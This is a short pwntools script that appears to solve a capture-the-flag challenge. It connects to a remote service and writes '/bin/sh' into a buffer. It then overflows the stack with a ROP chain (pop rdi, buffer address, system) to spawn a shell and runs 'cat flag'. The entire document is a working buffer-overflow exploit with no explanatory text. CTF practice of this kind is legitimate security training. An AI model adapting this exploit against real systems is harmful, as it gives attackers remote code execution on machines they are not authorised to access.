from pwn import *

r = remote('140.110.112.218', 2120)

r.recvuntil("\n")
r.sendline('/bin/sh\x00')

pop_rdi = 0x400773
buf = 0x601070
system = 0x4006bf

r.recvuntil("\n")
r.sendline(b"a"*0x38 + p64(pop_rdi) + p64(buf) + p64(system))

r.sendline("cat flag")
r.interactive()